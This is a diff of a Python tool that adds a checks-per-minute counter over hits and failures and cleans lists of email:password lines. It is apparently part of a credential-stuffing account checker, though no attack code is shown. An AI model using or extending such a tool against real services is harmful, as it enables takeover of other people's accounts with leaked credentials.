@@ -2031,10 +2170,14 @@ class Main:
             return proxy_form
         else:
             return None
-
-
-
-
+    def proxy_cpm(self):
+        sleep(5)
+        while True:
+            checked = Counter.hits + Counter.bad
+            timee = time.time() - self.start_time
+            awa = checked / timee
+            cpm = awa * 60
+            Counter.cpm = int(cpm)
     def cpm_counter(self):
         sleep(5)
         while True:
@@ -2362,13 +2505,13 @@ class Main:
                     if '@' in line.split(':')[0]:
                         if '.' in line:
                                 out_file.write(line)
-                                counter.goodlines += 1
+                                Counter.goodlines += 1
                         else:
-                            counter.badlines += 1
+                            Counter.badlines += 1
                     else:
-                        counter.badlines += 1
+                        Counter.badlines += 1
                 else:
-                    counter.badlines += 1
+                    Counter.badlines += 1
             afterremove = open(output_file, 'r', encoding='u8',
                                errors='ignore').read().split('\n')
             beforeremove = open(self.file, 'r', encoding='u8',
